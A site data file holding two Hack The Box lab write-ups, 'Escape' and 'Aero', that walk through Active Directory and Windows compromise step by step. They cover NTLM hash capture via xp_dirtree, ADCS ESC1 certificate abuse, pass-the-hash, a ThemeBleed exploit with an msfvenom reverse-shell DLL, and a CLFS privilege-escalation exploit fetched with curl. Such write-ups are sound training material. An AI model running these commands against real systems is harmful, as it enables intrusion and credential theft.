/* AUTO-GENERATED by build.py — do not edit by hand */
window.SVERZ_DATA = {
  "writeups": [
    {
      "title": "Escape",
      "slug": "escape",
      "date": "2026·04·06",
      "tags": [
        "htb",
        "medium",
        "windows",
        "active-directory",
        "mssql",
        "adcs"
      ],
      "desc": "20 open ports. Key services:",
      "body": "<h1 id=\"escape-hack-the-box\">Escape // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Windows Server 2019 (Build 17763)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.228.253</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>dc.sequel.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>DNS, Kerberos, SMB, LDAP, MSSQL, WinRM</td>\n</tr>\n<tr>\n<td>Domain</td>\n<td>sequel.htb</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan escape.htb\n</code></pre>\n<p>20 open ports. Key services:</p>\n<table>\n<thead>\n<tr>\n<th>Port</th>\n<th>Service</th>\n<th>Version</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>53</td>\n<td>DNS</td>\n<td>Simple DNS Plus</td>\n</tr>\n<tr>\n<td>88</td>\n<td>Kerberos</td>\n<td>Microsoft Windows Kerberos</td>\n</tr>\n<tr>\n<td>389</td>\n<td>LDAP</td>\n<td>AD LDAP (Domain: sequel.htb)</td>\n</tr>\n<tr>\n<td>445</td>\n<td>SMB</td>\n<td>SMB signing required</td>\n</tr>\n<tr>\n<td>1433</td>\n<td>MSSQL</td>\n<td>Microsoft SQL Server 2019 RTM (15.00.2000.00)</td>\n</tr>\n<tr>\n<td>5985</td>\n<td>WinRM</td>\n<td>Microsoft HTTPAPI 2.0</td>\n</tr>\n</tbody>\n</table>\n<p>Nmap detects a <strong>clock skew of +8h</strong> relative to the DC — a critical detail for Kerberos during exploitation.</p>\n<p>The LDAP/SSL certificate reveals:\n- <strong>CA</strong>: <code>sequel-DC-CA</code>\n- <strong>SAN</strong>: <code>dc.sequel.htb</code>, <code>sequel.htb</code></p>\n<h3 id=\"smb-share-enumeration\">SMB // Share Enumeration</h3>\n<pre><code class=\"language-bash\">smbget --recursive smb://10.129.228.253/Public\n</code></pre>\n<p>The <code>Public</code> share is accessible without authentication and contains the file <strong><code>SQL Server Procedures.pdf</code></strong>.</p>\n<p>The PDF contains temporary credentials for the MSSQL service:</p>\n<blockquote>\n<p><strong>PublicUser</strong> / <strong>GuestUserCantWrite1</strong> (SQL Server Authentication)</p>\n</blockquote>\n<h3 id=\"mssql-enumeration\">MSSQL // Enumeration</h3>\n<pre><code class=\"language-bash\">impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb -dc-ip 10.129.228.253\n</code></pre>\n<p>The <code>PublicUser</code> account has guest access to the <code>master</code> database. Enumeration performed:</p>\n<ul>\n<li>Accessible databases: <code>master</code>, <code>tempdb</code>, <code>msdb</code> (no <code>model</code>)</li>\n<li>No custom user tables</li>\n<li>Only SQL login: <code>PublicUser</code> (no other enumerable logins)</li>\n<li>No impersonation possible (<code>exec_as_login</code> fails on <code>sa</code> and all others)</li>\n</ul>\n<p>Also tried <a href=\"https://github.com/JFR-C/Database-Security-Audit/tree/master\">msdat</a> for a deeper audit (passwordstealer module) — no hashes extracted directly.</p>\n<hr>\n<h2 id=\"foothold\">Foothold</h2>\n<h3 id=\"ntlmv2-hash-capture-via-xp_dirtree\">NTLMv2 Hash Capture via xp_dirtree</h3>\n<p><strong>Root cause</strong>: the MSSQL user <code>PublicUser</code> has permission to execute <code>xp_dirtree</code>, which forces the SQL Server service to authenticate against an arbitrary SMB share, exposing the NTLMv2 hash of the service account.</p>\n<p>Listener:</p>\n<pre><code class=\"language-bash\">sudo responder -I tun0\n</code></pre>\n<p>From the MSSQL client:</p>\n<pre><code class=\"language-sql\">xp_dirtree &quot;\\\\10.10.14.139\\share&quot;\n</code></pre>\n<p>Responder captures the NTLMv2 hash of <code>sql_svc</code>:</p>\n<pre><code>sql_svc::sequel:d8dbff61f56eb017:3261DB7E4DEFF533287BE51B9D523766:0101000000000000008E433810C6DC01...\n</code></pre>\n<h3 id=\"hash-cracking\">Hash Cracking</h3>\n<pre><code class=\"language-bash\">hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 5600\n</code></pre>\n<p><strong>Result</strong>: <code>sql_svc</code> : <code>REGGIE1234ronnie</code></p>\n<h3 id=\"shell-as-sql_svc\">Shell as sql_svc</h3>\n<p>Credential verification:</p>\n<pre><code class=\"language-bash\">nxc smb sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie'     # [+] Pwn3d!\nnxc smb sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' --shares\n</code></pre>\n<p>Shares accessible with sql_svc: <code>NETLOGON</code> (READ), <code>SYSVOL</code> (READ).</p>\n<pre><code class=\"language-bash\">evil-winrm -i sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'\n</code></pre>\n<p>Privileges of <code>sql_svc</code>:\n- <code>SeMachineAccountPrivilege</code> — Add workstations to domain\n- <code>SeChangeNotifyPrivilege</code> — Bypass traverse checking\n- <code>SeIncreaseWorkingSetPrivilege</code> — Increase working set</p>\n<p>No directly exploitable privileges (no SeImpersonate, etc.).</p>\n<h3 id=\"lateral-movement-sql_svc-ryancooper\">Lateral Movement: sql_svc → Ryan.Cooper</h3>\n<p>Exploring the filesystem:</p>\n<pre><code>C:\\Users&gt; ls\n    sql_svc\n    Ryan.Cooper     ← access denied\n    Public\n\nC:\\SQLServer\\Logs&gt; ls\n    ERRORLOG.BAK\n</code></pre>\n<pre><code class=\"language-bash\">type C:\\SQLServer\\Logs\\ERRORLOG.BAK\n</code></pre>\n<p>The file contains consecutive failed login attempts:</p>\n<pre><code>2022-11-18 13:43:07.44 Logon  Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon  Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n</code></pre>\n<p><strong>Root cause</strong>: Ryan.Cooper entered his own password (<code>NuclearMosquito3</code>) in the username field during a SQL service login attempt. The two consecutive attempts from the same client <code>127.0.0.1</code> confirm that the same user made a field-swap mistake.</p>\n<p><strong>Credentials</strong>: <code>Ryan.Cooper</code> : <code>NuclearMosquito3</code></p>\n<pre><code class=\"language-bash\">evil-winrm -i sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'\n</code></pre>\n<p><strong>User flag</strong>: <code>C:\\Users\\Ryan.Cooper\\Desktop\\user.txt</code> ✓</p>\n<hr>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<h3 id=\"ad-enumeration-with-nxc-as-sql_svc\">AD Enumeration with nxc (as sql_svc)</h3>\n<p>Before pivoting to Ryan.Cooper, extensive LDAP enumeration:</p>\n<pre><code class=\"language-bash\">nxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' -M laps          # nothing\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' -M gpp_password   # nothing\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' --kerberoasting output.txt  # no SPNs\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' --find-delegation  # nothing\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' --trusted-for-delegation  # nothing\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' -M maq\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' -M get-desc-users\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' --gmsa            # nothing\nnxc ldap sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' -M adcs           # sequel-DC-CA found\n</code></pre>\n<p>Enumerated domain users: <code>Tom.Henn</code>, <code>Brandon.Brown</code>, <code>sql_svc</code>, <code>Ryan.Cooper</code>, <code>Administrator</code>.</p>\n<h3 id=\"winpeas-adcs-discovery\">WinPEAS // ADCS Discovery</h3>\n<p>Ran <code>winPeas.ps1</code> as sql_svc:</p>\n<pre><code class=\"language-bash\">upload /path/to/winPeas.ps1\n.\\winPeas.ps1\n</code></pre>\n<p>WinPEAS highlights:\n- <strong>Certificate Service DCOM Access</strong> — sql_svc is a member of this group\n- <code>StrongCertificateBindingEnforcement</code> — allow weak mapping (potentially vulnerable to ESC9)\n- <strong>Dangerous rights over templates</strong>: <code>User</code>, <code>UserSignature</code>, <code>ClientAuth</code>, <code>EFS</code> (WriteProperty, ExtendedRight)\n- Certificates with Client Authentication present on the machine\n- Suggestion: <em>\"Abuse with tools like Certipy (template write -&gt; ESC1 -&gt; enroll)\"</em></p>\n<h3 id=\"certipy-adcs-enumeration-sql_svc-vs-ryancooper\">Certipy // ADCS Enumeration (sql_svc vs Ryan.Cooper)</h3>\n<p>First enumeration as <strong>sql_svc</strong>:</p>\n<pre><code class=\"language-bash\">certipy find -u 'SQL_SVC@sequel.htb' -p 'REGGIE1234ronnie' \\\n    -dc-ip 10.129.228.253 -stdout -hide-admins\n</code></pre>\n<p>Result: <strong>33 templates found, 11 enabled</strong>. No vulnerabilities flagged.\nThe <code>UserAuthentication</code> template <strong>does not appear in the output</strong> — sql_svc has no visibility into it.</p>\n<p>Re-enumeration as <strong>Ryan.Cooper</strong>:</p>\n<pre><code class=\"language-bash\">certipy find -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \\\n    -dc-ip 10.129.228.253 -stdout -hide-admins\n</code></pre>\n<p>Result: <strong>34 templates found, 12 enabled</strong> — one additional template. The extra template is <code>UserAuthentication</code>, flagged as <strong>vulnerable to ESC1</strong>.</p>\n<pre><code class=\"language-bash\">certipy find -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \\\n    -dc-ip 10.129.228.253 -stdout -hide-admins -vulnerable\n</code></pre>\n<p>Only vulnerable result: <strong>UserAuthentication</strong></p>\n<table>\n<thead>\n<tr>\n<th>Property</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CA</td>\n<td>sequel-DC-CA</td>\n</tr>\n<tr>\n<td>Template</td>\n<td>UserAuthentication</td>\n</tr>\n<tr>\n<td>Enabled</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Client Authentication</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Certificate Name Flag</td>\n<td><strong>EnrolleeSuppliesSubject</strong></td>\n</tr>\n<tr>\n<td>Enrollment Flag</td>\n<td>IncludeSymmetricAlgorithms, PublishToDs</td>\n</tr>\n<tr>\n<td>Private Key Flag</td>\n<td>ExportableKey</td>\n</tr>\n<tr>\n<td>Extended Key Usage</td>\n<td>Client Authentication, Secure Email, EFS</td>\n</tr>\n<tr>\n<td>Enrollment Rights</td>\n<td><strong>SEQUEL.HTB\\Domain Users</strong></td>\n</tr>\n<tr>\n<td>Authorized Signatures Required</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Schema Version</td>\n<td>2</td>\n</tr>\n<tr>\n<td>Validity Period</td>\n<td>10 years</td>\n</tr>\n<tr>\n<td><strong>Vulnerability</strong></td>\n<td><strong>ESC1</strong> — Enrollee supplies subject + client auth</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Why sql_svc couldn't see it</strong>: certipy enumerates templates based on enrollment ACLs. The <code>UserAuthentication</code> template has enrollment rights for <code>Domain Users</code>, but sql_svc is a service account that may not have the same level of LDAP visibility or may be subject to additional ACL restrictions. With Ryan.Cooper (a standard domain user), the template becomes visible and exploitable. This explains why pivoting to Ryan.Cooper was <strong>necessary</strong> for privilege escalation — it was not possible to exploit ESC1 directly from sql_svc.</p>\n<p><strong>Root cause ESC1</strong>: the <code>UserAuthentication</code> template allows any Domain User to request a certificate specifying an arbitrary Subject Alternative Name (SAN), including <code>Administrator</code>. Combined with Client Authentication, the certificate can be used to authenticate via PKINIT Kerberos as any user.</p>\n<h3 id=\"certificate-request-as-administrator\">Certificate Request as Administrator</h3>\n<pre><code class=\"language-bash\">certipy req \\\n    -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \\\n    -dc-ip 10.129.228.253 -target dc.sequel.htb \\\n    -ca 'sequel-DC-CA' -template 'UserAuthentication' \\\n    -upn 'Administrator@sequel.htb'\n</code></pre>\n<pre><code>[*] Got certificate with UPN 'Administrator@sequel.htb'\n[*] Saving certificate and private key to 'administrator.pfx'\n</code></pre>\n<h3 id=\"clock-skew-fix\">Clock Skew Fix</h3>\n<p>The first authentication attempt with the certificate fails:</p>\n<pre><code>[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n</code></pre>\n<p>Nmap had already detected a clock skew of +8h. Kerberos requires the client clock to be within 5 minutes of the KDC.</p>\n<p>Fix:</p>\n<pre><code class=\"language-bash\">sudo timedatectl set-ntp off\nsudo apt install rdate\nsudo rdate -n 10.129.228.253\n</code></pre>\n<p>Ref: <a href=\"https://hackpuntes.com/posts/fixing-krb-ap-err-skew-kerberos-clock-skew/\">Fixing KRB_AP_ERR_SKEW</a></p>\n<h3 id=\"certificate-authentication-nt-hash\">Certificate Authentication → NT Hash</h3>\n<pre><code class=\"language-bash\">certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253\n</code></pre>\n<pre><code>[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee\n</code></pre>\n<h3 id=\"pass-the-hash-administrator\">Pass-the-Hash → Administrator</h3>\n<p>Verification:</p>\n<pre><code class=\"language-bash\">nxc smb sequel.htb -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee'\n</code></pre>\n<p>Shell:</p>\n<pre><code class=\"language-bash\">evil-winrm -i sequel.htb -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'\n</code></pre>\n<p><strong>Root flag</strong>: <code>C:\\Users\\Administrator\\Desktop\\root.txt</code> ✓</p>\n<hr>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User</strong>: ✓ (Ryan.Cooper)</li>\n<li><strong>Root</strong>: ✓ (Administrator)</li>\n</ul>\n<hr>\n<h2 id=\"attack-chain\">Attack Chain</h2>\n<pre><code>SMB Public share → SQL Server Procedures.pdf\n→ PublicUser:GuestUserCantWrite1\n→ MSSQL xp_dirtree → Responder → NTLMv2 sql_svc\n→ Hashcat → REGGIE1234ronnie\n→ Evil-WinRM (sql_svc)\n→ C:\\SQLServer\\Logs\\ERRORLOG.BAK\n→ Ryan.Cooper:NuclearMosquito3\n→ Evil-WinRM (Ryan.Cooper) → user.txt\n→ Certipy ESC1 (UserAuthentication template)\n→ administrator.pfx\n→ certipy auth → NT hash\n→ Pass-the-Hash → Administrator → root.txt\n</code></pre>\n<hr>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ol>\n<li>\n<p><strong>Credentials in shared files</strong>: the PDF in the <code>Public</code> share contained plaintext MSSQL credentials. Credentials should never be distributed in documents accessible without authentication.</p>\n</li>\n<li>\n<p><strong>xp_dirtree for NTLMv2 relay</strong>: even an MSSQL user with minimal privileges can force the service to authenticate against an external host, exposing the service account hash. Disable <code>xp_dirtree</code>, <code>xp_fileexist</code>, and similar procedures for unprivileged users.</p>\n</li>\n<li>\n<p><strong>Passwords in application logs</strong>: the ERRORLOG.BAK contained a password accidentally entered in the username field. Logs should be protected and, ideally, sanitized to prevent accidental credential exposure.</p>\n</li>\n<li>\n<p><strong>ADCS ESC1 — EnrolleeSuppliesSubject</strong>: the <code>UserAuthentication</code> template allowed any Domain User to specify an arbitrary SAN. This is one of the most common and dangerous ADCS misconfigurations. Remove the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag from templates with Client Authentication, or restrict enrollment to specific groups.</p>\n</li>\n<li>\n<p><strong>Kerberos clock skew</strong>: during PKINIT/Kerberos operations from a host not joined to the domain, the clock must be synchronized with the DC. Use <code>rdate</code> or <code>ntpdate</code> against the target DC.</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"tools-used\">Tools Used</h2>\n<table>\n<thead>\n<tr>\n<th>Tool</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>nmap</td>\n<td>Port scan, service/version detection</td>\n</tr>\n<tr>\n<td>smbget</td>\n<td>SMB share download</td>\n</tr>\n<tr>\n<td>impacket-mssqlclient</td>\n<td>Interactive MSSQL client</td>\n</tr>\n<tr>\n<td>msdat</td>\n<td>MSSQL security audit (<a href=\"https://github.com/JFR-C/Database-Security-Audit/tree/master\">repo</a>)</td>\n</tr>\n<tr>\n<td>responder</td>\n<td>NTLMv2 hash capture</td>\n</tr>\n<tr>\n<td>hashcat</td>\n<td>NTLMv2 cracking (mode 5600)</td>\n</tr>\n<tr>\n<td>nxc</td>\n<td>SMB/LDAP enumeration, ADCS discovery, PtH verification</td>\n</tr>\n<tr>\n<td>evil-winrm</td>\n<td>WinRM shell</td>\n</tr>\n<tr>\n<td>winPeas.ps1</td>\n<td>Windows privilege escalation enumeration</td>\n</tr>\n<tr>\n<td>certipy-ad v5.0.4</td>\n<td>ADCS enumeration + ESC1 exploitation (<a href=\"https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage\">wiki</a>)</td>\n</tr>\n<tr>\n<td>rdate</td>\n<td>Clock synchronization with DC</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage\">Certipy Usage Wiki</a></li>\n<li><a href=\"https://hackpuntes.com/posts/fixing-krb-ap-err-skew-kerberos-clock-skew/\">Fixing KRB_AP_ERR_SKEW (Clock Skew)</a></li>\n<li><a href=\"https://github.com/JFR-C/Database-Security-Audit/tree/master\">MSDAT — Database Security Audit Tool</a></li>\n<li><a href=\"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html\">HackTricks — AD Certificates</a></li>\n</ul>"
    },
    {
      "title": "Aero",
      "slug": "aero",
      "date": "2026·04·02",
      "tags": [
        "htb",
        "medium",
        "windows",
        "cve-2023-38146",
        "themebleed",
        "dll-injection"
      ],
      "desc": "See also: WebServices and Reconnaissance-and-Information-Gathering",
      "body": "<h1 id=\"aero-hack-the-box\">Aero // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Windows 11</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.229.128</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>Aero.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>HTTP/IIS (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<blockquote>\n<p>See also: WebServices and Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan aero.htb\n</code></pre>\n<pre><code>PORT   STATE SERVICE REASON          VERSION\n80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0\n|_http-title: Aero Theme Hub\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre>\n<p>Only one open port:\n- <strong>80/tcp</strong> — Microsoft IIS 10.0 — <strong>Aero Theme Hub</strong></p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.229.128  aero.htb&quot;\n</code></pre>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://aero.htb/ -x js,html,php,txt,json,docx \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -o scan/aero.dir\n</code></pre>\n<pre><code>200      GET      186l      870w    11650c http://aero.htb/\n200      GET      186l      870w    11650c http://aero.htb/home\n200      GET       36l      102w     1350c http://aero.htb/js/scripts.js\n200      GET    11203l    23329w   246671c http://aero.htb/css/styles.css\n</code></pre>\n<p>The web application is an <strong>\"Aero Theme Hub\"</strong> — a site for uploading custom Windows themes. The main page features an upload form that accepts <code>.theme</code> and <code>.themepack</code> files.</p>\n<hr>\n<h2 id=\"foothold-cve-2023-38146-themebleed-dll-injection-rce\">Foothold // CVE-2023-38146 (ThemeBleed) → DLL Injection → RCE</h2>\n<blockquote>\n<p><strong>Vulnerability — CVE-2023-38146 (ThemeBleed)</strong><br>\n<strong>Windows 11 Themes DLL Injection</strong> — arbitrary code execution via a malicious <code>.theme</code> file.</p>\n<p><strong>Structural root cause:</strong> Windows 11 (versions prior to September 2023) handles <code>.theme</code> files by loading an <code>.msstyles</code> file specified in the <code>[VisualStyles] Path</code> field. When the path points to a remote SMB share, Windows downloads the file and looks for a verification DLL (<code>_vrf.dll</code>) in the same location. An attacker can serve a malicious DLL in place of the legitimate one, achieving code execution in the context of the user who \"tests\" the theme.</p>\n</blockquote>\n<h3 id=\"step-1-clone-the-themebleed-poc\">Step 1 // Clone the ThemeBleed PoC</h3>\n<pre><code class=\"language-bash\">git clone https://github.com/Jnnshschl/CVE-2023-38146\ncd CVE-2023-38146\npip3 install -r requirements.txt\n</code></pre>\n<p>The <code>themebleed.py</code> tool automatically generates the malicious <code>.theme</code> and <code>.themepack</code> files and starts an SMB server that serves the DLL.</p>\n<h3 id=\"step-2-generate-the-malicious-theme-file\">Step 2 // Generate the malicious .theme file</h3>\n<pre><code class=\"language-bash\">python3 themebleed.py -r 10.10.14.139 -p 80 --no-dll\n</code></pre>\n<p>This generates:\n- <code>evil_theme.theme</code> — a theme file pointing to <code>\\\\10.10.14.139\\tb\\Aero.msstyles</code>\n- <code>evil_theme.themepack</code> — a CAB-compressed version of the same file</p>\n<p>Contents of the generated <code>.theme</code> file:</p>\n<pre><code class=\"language-ini\">; windows 11 theme exploit\n[Theme]\nDisplayName=@%SystemRoot%\\System32\\themeui.dll,-2060\n\n[Control Panel\\Desktop]\nWallpaper=%SystemRoot%\\web\\wallpaper\\Windows\\img0.jpg\nTileWallpaper=0\nWallpaperStyle=10\n\n[VisualStyles]\nPath=\\\\10.10.14.139\\tb\\Aero.msstyles\nColorStyle=NormalColor\nSize=NormalSize\n\n[MasterThemeSelector]\nMTSM=RJSPBS\n</code></pre>\n<p>The key field is <code>Path=\\\\10.10.14.139\\tb\\Aero.msstyles</code> — when Windows processes the theme, it contacts the attacker's SMB server to download the <code>.msstyles</code> file, and then loads the verification DLL (<code>Aero.msstyles_vrf_evil.dll</code>) from the same share.</p>\n<h3 id=\"step-3-generate-the-malicious-dll-with-msfvenom\">Step 3 // Generate the malicious DLL with msfvenom</h3>\n<blockquote>\n<p><strong>PoC DLL does not work</strong><br>\nThe DLL included in the ThemeBleed repository (<code>Aero.msstyles_vrf_evil.dll</code>) does not work correctly. A custom one must be generated with msfvenom containing a reverse shell payload.</p>\n</blockquote>\n<pre><code class=\"language-bash\">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.139 LPORT=80 -f dll -o Aero.msstyles_vrf_evil.dll\n</code></pre>\n<p>Rename and place the DLL in the PoC's <code>tb/</code> directory (overwriting the original):</p>\n<pre><code class=\"language-bash\">mv Aero.msstyles_vrf_evil.dll CVE-2023-38146/tb/Aero.msstyles_vrf_evil.dll\n</code></pre>\n<h3 id=\"step-4-start-the-smb-server-and-the-listener\">Step 4 // Start the SMB server and the listener</h3>\n<p>Start the ThemeBleed server (which includes the SMB server):</p>\n<pre><code class=\"language-bash\">python3 themebleed.py -r 10.10.14.139 -p 80 --no-dll\n</code></pre>\n<p>In another terminal, start the reverse shell listener:</p>\n<pre><code class=\"language-bash\">rlwrap -cAr nc -nvlp 80\n</code></pre>\n<h3 id=\"step-5-upload-the-malicious-themepack\">Step 5 // Upload the malicious themepack</h3>\n<p>Upload <code>evil_theme.themepack</code> through the site's upload form:</p>\n<p><img alt=\"upload.png\" src=\"img/upload.png\"></p>\n<p>The site confirms: <strong>\"File upload succeeded. Once we test your theme it will be added to the site!\"</strong></p>\n<p>The server simulates \"testing\" the theme: it opens the <code>.theme</code> file, follows the SMB path, downloads <code>Aero.msstyles</code>, and loads the malicious DLL — <strong>reverse shell as <code>aero\\sam.emerson</code></strong>.</p>\n<pre><code>connect to [10.10.14.139] from (UNKNOWN) [10.129.229.128] 49789\nC:\\Windows\\system32&gt;whoami\naero\\sam.emerson\n</code></pre>\n<h3 id=\"step-6-user-flag\">Step 6 // User flag</h3>\n<pre><code class=\"language-powershell\">PS C:\\Users\\sam.emerson\\Desktop&gt; cat user.txt\n</code></pre>\n<hr>\n<h2 id=\"privilege-escalation-cve-2023-28252-clfs-eop\">Privilege Escalation // CVE-2023-28252 (CLFS EoP)</h2>\n<blockquote>\n<p><strong>Vulnerability — CVE-2023-28252</strong><br>\n<strong>Windows Common Log File System (CLFS) Elevation of Privilege</strong> — privilege escalation from standard user to <code>nt authority\\system</code>.</p>\n<p><strong>Structural root cause:</strong> A vulnerability in the Windows CLFS driver (<code>clfs.sys</code>) allows kernel heap corruption through manipulation of <code>.BLF</code> (Base Log File) files. A local attacker can exploit this corruption to achieve an arbitrary write primitive in the kernel, elevating their privileges to SYSTEM. This CVE was actively exploited in the wild by the Nokoyawa ransomware group.</p>\n</blockquote>\n<h3 id=\"enumeration_1\">Enumeration</h3>\n<p>From the shell as <code>sam.emerson</code>:</p>\n<pre><code class=\"language-powershell\">PS C:\\&gt; whoami /priv\n</code></pre>\n<p>No directly exploitable privileges (<code>SeShutdownPrivilege</code> disabled).</p>\n<pre><code class=\"language-powershell\">PS C:\\&gt; systeminfo\n</code></pre>\n<p>The system is Windows 11 without the April 2023 patches — vulnerable to CVE-2023-28252.</p>\n<h3 id=\"cve-file-in-the-documents-folder\">CVE file in the Documents folder</h3>\n<p>In the <code>C:\\Users\\sam.emerson\\Documents</code> folder there is a <code>CVE-2023-28252_Summary.pdf</code> file that confirms the CLFS vulnerability. To quickly transfer the file to the attacker machine without needing an HTTP or SMB server:</p>\n<pre><code class=\"language-powershell\"># Target: encode in Base64\n[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\sam.emerson\\Documents\\CVE-2023-28252_Summary.pdf'))\n</code></pre>\n<p>Copy the Base64 output and decode it on the attacker machine:</p>\n<pre><code class=\"language-bash\"># Attacker: decode\necho '&lt;BASE64_STRING&gt;' | base64 -d &gt; CVE-2023-28252_Summary.pdf\n</code></pre>\n<h3 id=\"transferring-the-exploit\">Transferring the exploit</h3>\n<p>Clone the compiled PoC on the attacker machine:</p>\n<pre><code class=\"language-bash\">git clone https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252\n</code></pre>\n<p>Serve the binary:</p>\n<pre><code class=\"language-bash\">sudo python3 -m http.server 80\n</code></pre>\n<p>Download it on the target machine:</p>\n<pre><code class=\"language-powershell\">PS C:\\Users\\sam.emerson&gt; curl.exe http://10.10.14.139/clfs_eop.exe -o C:\\Users\\sam.emerson\\clfs_eop.exe\n</code></pre>\n<h3 id=\"running-the-exploit\">Running the exploit</h3>\n<p>The <code>clfs_eop.exe</code> exploit accepts a command to execute as SYSTEM. A Base64-encoded PowerShell reverse shell is used:</p>\n<pre><code class=\"language-powershell\">PS C:\\Users\\sam.emerson&gt; .\\clfs_eop.exe &quot;powershell -e &quot;\n</code></pre>\n<p>The decoded Base64 payload is a classic PowerShell TCP reverse shell to <code>10.10.14.139:443</code>.</p>\n<p>On the listener:</p>\n<pre><code class=\"language-bash\">rlwrap -cAr nc -nvlp 443\n</code></pre>\n<pre><code>connect to [10.10.14.139] from (UNKNOWN) [10.129.12.231] 49789\nPS C:\\Users\\sam.emerson&gt; whoami\nnt authority\\system\n</code></pre>\n<h3 id=\"root-flag\">Root flag</h3>\n<pre><code class=\"language-powershell\">PS C:\\Users\\administrator\\Desktop&gt; cat root.txt\n07f1ce58ba664ab4aed5d822d7690329\n</code></pre>\n<hr>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> obtained as <code>aero\\sam.emerson</code> via ThemeBleed DLL injection</li>\n<li><strong>Root:</strong> <code>07f1ce58ba664ab4aed5d822d7690329</code> — obtained via CVE-2023-28252 CLFS EoP → <code>nt authority\\system</code></li>\n</ul>\n<hr>\n<h2 id=\"attack-chain\">Attack Chain</h2>\n<pre><code>Nmap (80) → IIS 10.0 &quot;Aero Theme Hub&quot; (theme upload) →\nCVE-2023-38146 ThemeBleed: .theme with SMB Path → DLL injection →\nmsfvenom DLL (shell_reverse_tcp) replacing the original DLL →\nUpload evil_theme.themepack → Reverse shell sam.emerson →\nCVE-2023-28252 CLFS EoP (clfs_eop.exe) →\npowershell -e &lt;base64 reverse shell&gt; → nt authority\\system\n</code></pre>\n<hr>\n<h2 id=\"lessons-learned\">Lessons 